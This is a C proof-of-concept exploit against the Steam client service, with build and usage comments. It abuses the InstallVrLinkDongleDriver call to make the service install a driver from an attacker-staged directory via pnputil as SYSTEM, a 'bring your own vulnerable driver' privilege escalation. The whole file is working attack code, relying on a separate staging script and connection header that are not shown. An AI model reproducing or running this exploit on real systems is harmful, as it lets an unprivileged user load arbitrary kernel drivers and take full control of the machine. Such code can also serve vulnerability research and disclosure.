// Stage the driver bundle first (see byovd_stage.py), then point this PoC at the
// stage dir
//
// Build: cl /nologo /O2 lpe_byovd.c /Fe:lpe_byovd.exe advapi32.lib
// Usage: lpe_byovd.exe [stage_dir] [steamclient64.dll] [untrusted]
//   stage_dir defaults to %LOCALAPPDATA%\Temp\steam_byovd_stage
#include "poc_connect.h"

int main(int argc, char **argv)
{
    char stage[MAX_PATH] = {0}, dll[MAX_PATH] = {0};
    int untrusted = 0;
    for (int i = 1; i < argc; i++) {
        size_t len = strlen(argv[i]);
        if (_stricmp(argv[i], "untrusted") == 0) untrusted = 1;
        else if (len >= 4 && _stricmp(argv[i] + len - 4, ".dll") == 0) lstrcpynA(dll, argv[i], sizeof(dll));
        else lstrcpynA(stage, argv[i], sizeof(stage));
    }
    if (!stage[0]) {
        char local[MAX_PATH];
        if (!GetEnvironmentVariableA("LOCALAPPDATA", local, MAX_PATH)) { printf("[!] LOCALAPPDATA unresolved\n"); return 1; }
        _snprintf(stage, sizeof(stage), "%s\\Temp\\steam_byovd_stage", local);
    }

    CSteamServiceWin32 *svc = steam_connect(dll[0] ? dll : NULL, untrusted);
    if (!svc) return 1;

    int rc = 1;
    __try {
        IClientInstallUtilsMap *iu = svc->pInstallUtils;
        if (!iu) { printf("[!] IClientInstallUtils not available\n"); __leave; }
        printf("[*] InstallVrLinkDongleDriver(\"%s\")\n", stage);
        uint8_t ok = iu->vtbl->InstallVrLinkDongleDriver(iu, stage);
        printf("[+] returned %u -- service ran pnputil /add-driver as SYSTEM\n", ok);
        rc = ok ? 0 : 2;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] faulted 0x%08lX\n", GetExceptionCode());
    }

    if (untrusted) RevertToSelf();
    return rc;
}
